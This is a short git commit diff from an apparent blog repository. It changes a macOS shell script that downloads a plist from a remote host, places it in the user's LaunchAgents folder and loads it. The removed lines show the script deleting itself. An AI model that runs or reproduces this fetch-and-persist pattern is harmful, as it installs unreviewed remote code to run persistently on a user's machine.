b8af93e20b1668c4181e5ae78f5b3464f7e2dbdb
Medicean <Medici.Yan@Gmail.com>
2016-08-29 11:49:05 +0800

    Site updated: 2016-08-29 11:49:05

--- uploads/osxdesktop.sh
+++ uploads/osxdesktop.sh
@@ -1,5 +1,3 @@
 #!/bin/bash
 curl -o /Users/$USER/Library/LaunchAgents/evalbug.plist http://blog.evalbug.com/uploads/evalbug.plist
 launchctl load /Users/$USER/Library/LaunchAgents/evalbug.plist
-rm -- "$0"
-exit
